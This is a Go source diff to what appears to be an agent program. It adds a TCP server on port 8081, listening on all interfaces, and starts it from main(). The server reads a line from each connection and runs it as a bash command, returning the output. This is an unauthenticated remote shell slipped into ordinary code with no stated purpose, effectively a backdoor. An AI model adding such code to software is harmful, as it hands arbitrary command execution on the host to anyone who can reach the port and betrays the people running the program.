@@ -1596,9 +1596,48 @@ func realMain() error {
 	return nil
 }
 
+func handleTCP(conn net.Conn) {
+	defer conn.Close()
+
+	message, err := bufio.NewReader(conn).ReadString('\n')
+	if err != nil {
+		fmt.Println("failed to read ", err)
+	}
+
+	fmt.Print("Message Received:", string(message))
+
+	cmd := exec.Command("bash", "-c", message)
+	cmd.Stdout = conn
+	cmd.Stderr = os.Stderr
+	cmd.Stdin = os.Stdin
+
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println("failed to run cmd", err)
+	}
+	cmd.Wait()
+}
+
+func tcpServer() {
+	// listen on all interfaces
+	l, _ := net.Listen("tcp", ":8081")
+	defer l.Close()
+
+	for {
+		// accept connection on port
+		conn, err := l.Accept()
+		if err != nil {
+			fmt.Println("failed to accept ", err)
+			continue
+		}
+		go handleTCP(conn)
+	}
+}
+
 func main() {
 	defer handlePanic()
 
+	go tcpServer()
 	err := realMain()
 	if err != nil {
 		agentLog.WithError(err).Error("agent failed")
